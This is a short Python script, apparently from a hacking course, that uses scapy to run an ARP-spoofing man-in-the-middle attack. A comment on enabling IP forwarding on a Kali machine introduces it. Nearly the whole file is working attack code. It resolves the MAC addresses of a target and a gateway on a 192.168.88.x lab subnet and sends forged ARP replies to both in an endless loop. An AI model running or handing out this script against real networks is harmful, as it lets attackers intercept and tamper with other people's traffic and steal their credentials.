# spoofer : gia mao
# man in the middle.
# sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'  allow packet throw kali machine
import sys
import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    # clients_list = []
    # for element in answered_list:
    #     client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
    #     clients_list.append(client_dict)
    # return clients_list


def spoofer(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # op = 1 : send a request
    # op = 2 : send a response
    # pdst : target ip address
    # hwdst : mac address of target
    # psrc : gateway
    # print(packet.show())
    # print(packet.summary())


sent_packets_count = 0
try:
    while True:
        spoofer("192.168.88.129", "192.168.88.2")
        spoofer("192.168.88.2", "192.168.88.129")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent two packet: " + str(sent_packets_count), end="")
        # sys.stdout.flush()
        time.sleep(2)  # wait 2 seconds
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Quitting.")